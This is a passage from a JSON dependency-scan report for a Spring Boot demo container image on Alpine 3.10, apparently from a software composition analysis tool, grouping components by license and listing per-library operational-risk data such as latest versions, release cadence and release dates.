                        "alpine://3.10:liblksctp:1.0.18-r0",
                        "alpine://3.10:libcom_err:1.45.5-r0",
                        "alpine://3.10:libuuid:2.33.2-r0",
                        "alpine://3.10:libtasn1:4.14-r0",
                        "alpine://3.10:libstdc++:8.3.0-r0",
                        "alpine://3.10:alsa-lib:1.1.9-r0",
                        "alpine://3.10:libgcc:8.3.0-r0",
                        "alpine://3.10:keyutils-libs:1.6-r1"
                    ]
                },
                {
                    "name": "EPL-2.0",
                    "full_name": "Eclipse Public License 2.0",
                    "more_info_url": [
                        "https://www.opensource.org/licenses/EPL-2.0",
                        "https://www.eclipse.org/legal/epl-2.0",
                        "https://spdx.org/licenses/EPL-2.0"
                    ],
                    "components": [
                        "gav://jakarta.annotation:jakarta.annotation-api:2.1.1",
                        "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.42"
                    ]
                },
                {
                    "name": "GPL-2.0+CE",
                    "components": [
                        "gav://jakarta.annotation:jakarta.annotation-api:2.1.1"
                    ]
                },
                {
                    "name": "LGPL-2.1",
                    "full_name": "GNU Lesser General Public License v2.1 only",
                    "more_info_url": [
                        "https://opensource.org/licenses/LGPL-2.1",
                        "https://www.gnu.org/licenses/old-licenses/lgpl-2.1-standalone.html",
                        "https://spdx.org/licenses/LGPL-2.1",
                        "http://www.gnu.org/licenses/old-licenses/lgpl-2.1-standalone.html",
                        "http://www.opensource.org/licenses/LGPL-2.1"
                    ],
                    "components": [
                        "alpine://3.10:nspr:4.20-r0",
                        "gav://ch.qos.logback:logback-core:1.5.18",
                        "gav://ch.qos.logback:logback-classic:1.5.18"
                    ]
                },
                {
                    "name": "Unknown",
                    "full_name": "Unknown license",
                    "more_info_url": [
                        "Unknown link"
                    ],
                    "components": [
                        "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                        "generic://sha256:c91453556b41a5544f980c561774bf9a2d654fa31ee8ae1db4532fb3b2bd3df2/sunjce_provider.jar",
                        "generic://sha256:6308b96d4cd09ddbc72e5e43720c08912b69bc986216796736c0aecd36958768/jfr.jar",
                        "generic://sha256:4dce85eda539e201ba30c7fdfca4f1f860fe0b360474a7e67cf7f099b0b48b0e/local_policy.jar",
                        "generic://sha256:65f59dd8880727dab253f5967f0203c5b8e8c5bc92196ec1c5760bf756f05ab0/rt.jar",
                        "generic://sha256:00ba99a450be14692f0cafa326ea2683a2c9ab8641df55da73eb5506866a2963/US_export_policy.jar",
                        "generic://sha256:ca0206d0ad4bcfe4605ebbd802e4488b3618141eca0d522881c5d4b3df7f4739/local_policy.jar",
                        "alpine://3.10:encodings:1.0.4-r1",
                        "generic://sha256:427a6fe46fada8aba0acb0ec274ec35614580b5f045a85acd2f33c6b384398c7/jsse.jar",
                        "gav://com.example:demo:0.0.1-SNAPSHOT",
                        "generic://sha256:f39a3ed0e08b749ce99058947776f78638fae93bc9f6571d20536b19f66c622b/jaccess.jar",
                        "generic://sha256:fb95335dbe93f303ca526c939662951056fb3fdf8b4afba40482db0f05db3f8d/localedata.jar",
                        "alpine://3.10:ttf-dejavu:2.37-r1",
                        "generic://sha256:c185de649564fca3c43f103e2120cac627de23fe9ea6d8694c9065d87dff5286/management-agent.jar",
                        "alpine://3.10:openjdk8-jre:8.275.01-r0",
                        "generic://sha256:e416d53c35b59cf8351657c5b322e714ecd26bcd6cd8f5ced2da1b458873ed53/resources.jar",
                        "generic://sha256:41954e3446238454f839d64158c9f8faa83d49c962fd173c72f9e31200d884af/nashorn.jar",
                        "alpine://3.10:libxcomposite:0.4.5-r0",
                        "generic://sha256:43d37ded0038dffefb5e18bdcf999ed883e00ca1d5d394a59dab9495871a340d/charsets.jar",
                        "alpine://3.10:pcsc-lite-libs:1.8.25-r1",
                        "generic://sha256:dbe380d701c0579cc2acb8a7000a13edc6857e7acbb4c807e85538455510d146/jce.jar",
                        "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                        "alpine://3.10:libxrender:0.9.10-r3",
                        "generic://sha256:5be247405c33cec2b64ab8a2b42d2e6c956add9fb4770dd87cfbe99747c9ac65/zipfs.jar",
                        "generic://sha256:83c794468a1b25a7b720fa200285544d44c52f22d26d4ff2ff22bfed15bcc6c9/dnsns.jar",
                        "generic://sha256:24b5fdbd57727af8cba858613c299e54c5e1d5eb6d1f47811d8aa1c0d24e99be/sunpkcs11.jar",
                        "alpine://3.10:libxtst:1.2.3-r3",
                        "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                        "alpine://3.10:libxi:1.7.9-r2",
                        "generic://sha256:4a02f638fa3a3d8387b40bb4b9cffc8ba9d6be196afef4b0771b5b44105be65d/app.jar",
                        "alpine://3.10:libx11:1.6.12-r1",
                        "generic://sha256:e70adc5335500d66535871ecaea9431862f91729b74ca5935c40d47c9ef018d7/cldrdata.jar",
                        "generic://sha256:604e749c4546fa2b34e347f672f1b3a44daa8820f51d741f5552c4962e675dff/sunec.jar",
                        "alpine://3.10:sqlite-libs:3.28.0-r3"
                    ]
                }
            ],
            "operational_risks": [
                {
                    "component_id": "gav://org.apache.logging.log4j:log4j-to-slf4j:2.24.3",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "3.0.0-beta2",
                    "newer_versions": 0,
                    "cadence": 5,
                    "commits": null,
                    "committers": null,
                    "released": "2024-12-10T10:51:00Z"
                },
                {
                    "component_id": "gav://org.springframework.security:spring-security-crypto:6.4.7",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-16T18:32:00Z"
                },
                {
                    "component_id": "gav://org.springframework.security:spring-security-web:6.4.7",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M1",
                    "newer_versions": 1,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-16T18:32:00Z"
                },
                {
                    "component_id": "gav://org.springframework:spring-aop:6.2.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M7",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-12T09:29:00Z"
                },
                {
                    "component_id": "gav://ch.qos.logback:logback-classic:1.5.18",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "1.5.18",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-03-18T12:48:00Z"
                },
                {
                    "component_id": "gav://com.fasterxml.jackson.core:jackson-core:2.18.4.1",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "2.20.0-rc1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-11T01:14:00Z"
                },
                {
                    "component_id": "gav://org.slf4j:slf4j-api:2.0.17",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "2.1.0-alpha1",
                    "newer_versions": 0,
                    "cadence": 4,
                    "commits": null,
                    "committers": null,
                    "released": "2025-02-25T16:43:00Z"
                },
                {
                    "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:3.4.7",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "4.0.0-M1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-19T10:33:00Z"
                },
                {
                    "component_id": "gav://org.yaml:snakeyaml:2.3",
                    "risk": "High",
                    "risk_reason": "Health",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "2.4",
                    "newer_versions": 0,
                    "cadence": 2,
                    "commits": null,
                    "committers": null,
                    "released": "2024-08-31T17:22:00Z"
                },
                {
                    "component_id": "gav://com.fasterxml.jackson.core:jackson-annotations:2.18.4",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "3.0-rc5",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-05-07T00:01:00Z"
                },
                {
                    "component_id": "gav://org.apache.logging.log4j:log4j-api:2.24.3",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "3.0.0-beta2",
                    "newer_versions": 0,
                    "cadence": 5,
                    "commits": null,
                    "committers": null,
                    "released": "2024-12-10T10:51:00Z"
                },
                {
                    "component_id": "gav://org.springframework.boot:spring-boot-jarmode-tools:3.4.7",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "4.0.0-M1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-19T10:32:49Z"
                },
                {
                    "component_id": "gav://org.springframework.security:spring-security-core:6.4.7",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M1",
                    "newer_versions": 1,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-16T18:32:00Z"
                },
                {
                    "component_id": "gav://org.springframework:spring-web:6.2.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M7",
                    "newer_versions": 1,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-12T09:28:00Z"
                },
                {
                    "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.18.4",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "2.20.0-rc1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-05-07T00:29:00Z"
                },
                {
                    "component_id": "gav://io.micrometer:micrometer-commons:1.14.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "1.16.0-M1",
                    "newer_versions": 1,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-09T19:26:00Z"
                },
                {
                    "component_id": "gav://org.springframework:spring-webmvc:6.2.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M7",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-12T09:27:00Z"
                },
                {
                    "component_id": "gav://ch.qos.logback:logback-core:1.5.18",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "1.5.18",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-03-18T12:47:00Z"
                },
                {
                    "component_id": "gav://org.slf4j:jul-to-slf4j:2.0.17",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "2.1.0-alpha1",
                    "newer_versions": 0,
                    "cadence": 4,
                    "commits": null,
                    "committers": null,
                    "released": "2025-02-25T16:46:00Z"
                },
                {
                    "component_id": "gav://org.springframework:spring-context:6.2.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M7",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-12T09:29:00Z"
                },
                {
                    "component_id": "gav://org.springframework:spring-expression:6.2.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M7",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-12T09:29:00Z"
                },
                {
                    "component_id": "gav://jakarta.annotation:jakarta.annotation-api:2.1.1",
                    "risk": "High",
                    "risk_reason": "Health",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "3.0.0",
                    "newer_versions": 5,
                    "cadence": 0,
                    "commits": null,
                    "committers": null,
                    "released": "2022-06-14T11:30:18Z"
                },
                {
                    "component_id": "gav://org.springframework.boot:spring-boot:3.4.7",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "4.0.0-M1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-19T10:33:00Z"
                },
                {
                    "component_id": "gav://org.springframework:spring-beans:6.2.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M7",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-12T09:29:00Z"
                },
                {
                    "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.18.4",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "2.20.0-rc1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-05-07T01:00:00Z"
                },
                {
                    "component_id": "gav://com.fasterxml.jackson.module:jackson-module-parameter-names:2.18.4",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "2.20.0-rc1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-05-07T01:00:00Z"
                },
                {
                    "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-el:10.1.42",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "11.0.10",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-05T22:46:00Z"
                },
                {
                    "component_id": "gav://org.springframework.security:spring-security-config:6.4.7",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M1",
                    "newer_versions": 1,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-16T18:32:00Z"
                },
                {
                    "component_id": "gav://org.springframework:spring-core:6.2.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "7.0.0-M7",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-12T09:29:00Z"
                },
                {
                    "component_id": "gav://org.springframework:spring-jcl:6.2.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "6.2.9",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-12T09:28:00Z"
                },
                {
                    "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.18.4",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "2.20.0-rc1",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-05-07T01:00:00Z"
                },
                {
                    "component_id": "gav://io.micrometer:micrometer-observation:1.14.8",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "1.16.0-M1",
                    "newer_versions": 1,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-09T19:26:00Z"
                },
                {
                    "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.42",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "11.0.10",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-05T22:46:00Z"
                },
                {
                    "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:10.1.42",
                    "risk": "None",
                    "risk_reason": "None",
                    "is_eol": null,
                    "eol_message": "",
                    "latest_version": "11.0.10",
                    "newer_versions": 0,
                    "cadence": 10,
                    "commits": null,
                    "committers": null,
                    "released": "2025-06-05T22:46:00Z"
                }
            ]
        }
    ]
}